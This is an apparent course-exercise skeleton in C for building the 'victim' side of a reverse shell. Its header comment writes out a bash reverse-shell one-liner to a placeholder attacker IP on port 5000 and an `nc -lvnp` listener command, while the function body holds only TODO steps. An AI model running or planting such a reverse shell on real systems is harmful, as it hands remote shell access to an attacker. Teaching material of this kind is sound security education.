/**
 * Instructions: You will need to complete all the TODOs to complete this task. You can implement some of the
 * socket code by using the wrapper calls in utils.c or just implement it directly in the 'main' function.
 *
 * The goal of this exercise is to create the "victim" side of the reverse shell. I.e. `bash -i >& /dev/tcp/<attacker_ip>/5000 0>&1`
 * - Your program should take in 1 argument that is a valid ipv4 address i.e. 192.168.xx.xx which points to the attacker's ip.
 * - You will need to create a socket and connect to the attacker's server.
 * - You will need to start an interactive shell that can be used on the victim machine
 * - To test this, use your program from exercise 2 or use `nc -lvnp 5000` to create an attacker server. See demo gif for example.
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <errno.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <string.h>
#include "../include/utils.h"

#define PORT 5000

void usage(char* prog_name);

int main(int argc, char** argv) {

    if (argc < 2) {
        usage(argv[0]);
        exit(EXIT_FAILURE);
    }

    // TODO: Declare variables here


    // TODO: Retrieve attacker ip from passed in argument and check if it's a valid ipv4 address


    // TODO: Create connection socket to the attacker/host


    // TODO: Set up the address structure. Set it up to target the attacker ip on the defined PORT. Also use ipv4.


    // TODO: Redirect the pipes i.e. `bash -i >& /dev/tcp/<attacker_ip>/5000 0>&1`


    // TODO: Call execve to create shell


    // TODO: Perform cleanup as needed

}

void usage(char* prog_name) {
    fprintf(stderr, "Usage: %s <ip>\n", prog_name);
}
